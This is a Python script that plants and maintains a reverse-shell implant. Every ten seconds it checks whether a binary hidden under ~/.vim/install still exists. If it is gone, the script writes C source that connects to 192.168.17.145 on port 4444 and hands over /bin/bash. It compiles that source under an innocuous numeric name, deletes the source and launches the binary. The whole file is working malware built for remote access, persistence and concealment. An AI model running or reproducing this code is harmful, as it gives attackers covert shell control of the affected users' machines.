#/usr/bin/python


import time
import os, sys
import subprocess
from subprocess import call

def main():
    
    startTime = time.time()
    
    childPath = "/home/" + subprocess.check_output('whoami', shell=True).replace("\n","") + "/.vim/install/6492005662856/80270340"  
    childPathParent = childPath.rpartition('/')[0]
    
    print childPath
    print childPathParent

    while True:
        print ("[!] Ensuring child still exists at {} [!]".format(childPath))
        
        time.sleep(10.0 - ((time.time() - startTime) % 10.0))
        
        if os.path.exists(childPath):
            print ("[!] Child at {} exists [!]".format(childPath))

        else:
            print ("[!] Child at {} does not exist [!]".format(childPath))

            if not os.path.exists(childPathParent):
                print ("[!] Parent directory of child at {} not found, creating... [!]".format(childPathParent))
                dirExists(childPathParent)

            print ("[!] Writing c program to config.c at {} [!]".format(childPath))
            
            with open ('config.c', 'w') as child:
                child.write('''\

#include <stdio.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <stdlib.h>
#include <unistd.h>
#include <netinet/in.h>
#include <arpa/inet.h>

int main(int argc, char **argv[])
{	
	const char* ip = "192.168.17.145"; 
	int sockt;
	int port = 4444;

	struct sockaddr_in revsockaddr;

	revsockaddr.sin_family = AF_INET;
	revsockaddr.sin_port = htons(port);
	revsockaddr.sin_addr.s_addr = inet_addr(ip);


	sockt = socket(AF_INET, SOCK_STREAM, 0);
	connect(sockt, (struct sockaddr *) &revsockaddr, sizeof(revsockaddr));

	dup2(sockt, 0);
	dup2(sockt, 1);
	dup2(sockt, 2);

	char * const argve[] = {"/bin/bash", NULL};
	execve("/bin/bash", argve, NULL);

	return 0;
}


                ''')
            print("[!] compiling config.c to config [!]")
            call(["gcc", "-o", "80270340", "config.c"])
            print("[!] removing config.c [!]")
            call(["rm", "-f", "config.c"])
            print("[!] moving config to {} [!]".format(childPathParent))
            call(["mv", "80270340", childPathParent])
            print("[!] calling ./config [!]")
            call([childPath])           


def dirExists(file_path):

    dir_list = []

    while not os.path.exists(file_path):
        dir_list.append(os.path.basename(file_path))
        print dir_list
        file_path = file_path.rpartition('/')[0]
        print file_path

    while (len(dir_list) != 0):
        os.makedirs(file_path + "/" + dir_list[-1])
        print file_path
        file_path = file_path + "/" + dir_list.pop()
        print file_path

if __name__ == "__main__":
    main()
